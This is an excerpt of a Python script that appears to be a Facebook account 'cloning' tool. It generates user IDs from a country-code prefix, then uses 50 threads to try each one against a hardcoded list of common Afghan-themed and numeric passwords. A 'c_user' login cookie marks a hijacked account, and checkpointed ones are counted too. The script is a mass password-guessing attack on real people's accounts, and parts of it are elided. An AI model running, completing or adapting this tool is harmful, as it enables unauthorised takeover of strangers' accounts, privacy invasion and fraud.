...
def afg():
    ...
    os.system("clear")
    print(logo)    
    limit = int(input('\033[1;97m[~] Cloning limit : \033[1;91m1000, 2000, 3000, 5000\n\033[1;97m====================================================\n\033[1;97m[~] Put Limit :\033[1;92m '))
    ...
    with ThreadPool(max_workers=50) as basir:
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','Afghan123','Afghan12345','Afghan1234','123456','700800','500500','900900','200300','100200','600700','800900','300400','500600','Afghanistan','Afghanistan123','khankhan','khan1234','khan12345','khan123','kabul1234','kabul12345','kabol123','۱۰۰۲۰۰','۲۰۰۳۰۰','۵۰۰۵۰۰','۹۰۰۹۰۰','۶۰۰۶۰۰']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[ESA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
